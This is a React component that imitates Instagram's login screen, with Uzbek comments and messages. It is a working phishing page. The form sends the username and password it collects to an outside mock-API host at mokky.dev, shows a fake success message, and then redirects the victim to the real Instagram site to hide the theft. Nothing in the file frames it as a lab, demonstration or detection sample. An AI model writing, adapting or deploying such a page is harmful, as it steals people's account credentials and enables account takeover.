import React, { useState } from "react";
import axios from "axios";
import { ToastContainer, toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";

const InstagramLogin = () => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (username.trim() === "" || password.trim() === "") {
      toast.error("❌ Iltimos, barcha maydonlarni to‘ldiring!");
      return;
    }

    if (password.length < 6) {
      toast.error("❌ Parol kamida 6 ta belgi bo‘lishi kerak!");
      return;
    }

    try {
      // ✅ API-ga ma’lumotlarni yuboramiz
      const response = await axios.post("https://f8a3f2c439e7a64e.mokky.dev/user", {
        username,
        password,
      });

      console.log("Server javobi:", response.data);
      toast.success("✅ Muvaffaqiyatli login! Instagramga yo‘naltirilmoqda...");

      // 2 soniyadan keyin Instagramga yo‘naltirish
      setTimeout(() => {
        window.location.href = "https://www.instagram.com";
      }, 2000);

    } catch (error) {
      console.error("API Xatolik:", error);
      toast.error("❌ Login amalga oshmadi! Iltimos, qayta urinib ko‘ring.");
    }

    // Input maydonlarini tozalash
    setUsername("");
    setPassword("");
  };

  return (
    <div className="flex items-center justify-center min-h-screen bg-gray-100">
      <div className="bg-white p-8 rounded-lg shadow-lg w-80">
        <h2 className="text-center text-2xl font-bold mb-4">Instagram</h2>
        <form onSubmit={handleSubmit} className="space-y-4">
          <input
            type="text"
            placeholder="Phone number, username or email"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            className="w-full border px-3 py-2 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-400"
          />
          <input
            type="password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="w-full border px-3 py-2 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-400"
          />
          <button
            type="submit"
            className="w-full bg-blue-500 text-white py-2 rounded-md hover:bg-blue-600 transition"
          >
            Login
          </button>
        </form>
        <div className="text-center mt-4 text-sm text-blue-500 cursor-pointer">
          Forgot password?
        </div>
        <div className="mt-4 text-center text-gray-600 text-sm">
          Don’t have an account? <span className="text-blue-500 cursor-pointer">Sign Up</span>
        </div>
      </div>
      <ToastContainer position="top-right" autoClose={3000} />
    </div>
  );
};

export default InstagramLogin;
  